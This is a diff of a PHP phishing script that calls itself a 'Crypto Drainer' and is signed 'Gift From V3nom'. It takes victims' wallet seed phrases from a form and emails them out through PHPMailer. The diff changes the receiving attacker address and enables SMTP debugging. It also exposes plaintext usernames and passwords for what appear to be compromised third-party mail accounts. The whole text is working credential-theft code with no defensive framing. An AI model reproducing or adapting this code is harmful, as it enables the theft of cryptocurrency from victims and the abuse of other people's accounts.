@@ -21,7 +21,8 @@ $wallet_phrase = htmlspecialchars(trim($_POST["wallet_phrase"]));
 $wallet_name = htmlspecialchars(trim($_POST["wallet_name"]));
 
 // Consider using environment variables for credentials
-$to_email = 'anijahchukwuka13@gmail.com';
+//$to_email = 'anijahchukwuka13@gmail.com';
+$to_email = 'secureserve07@gmail.com';
 $body = "⚜️ Crypto Drainer ⚜️\r\nWallet Phrase: $wallet_phrase\r\nWallet Name: $wallet_name\r\n⚜️ Gift From V3nom ⚜️";
 $subject = 'Gift From V3nom';
 
@@ -32,6 +33,7 @@ try {
     $mail->SMTPAuth = true;
     $mail->Username = 'gebeyaw.a@asdepo.org';
     $mail->Password = 'Gebeyaw@2049##';
+	$mail->SMTPDebug = 1;
     $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
     $mail->Port = 587;
     $mail->setFrom('webmail.asdepo.org', 'V3nom');
@@ -74,7 +76,7 @@ try {
 	$mail->Username = 'tito@koohejibuildingcare.com';
 	$mail->Password = 'Tito@578dh*';
 	$mail->SMTPSecure = 'tls';
-	$mail->SMTPDebug = 0;
+	$mail->SMTPDebug = 1;
 	$mail->Port = 587;
 	$mail->setFrom('tito@koohejibuildingcare.com', 'V3nom');
 	$mail->addAddress($to_email); 
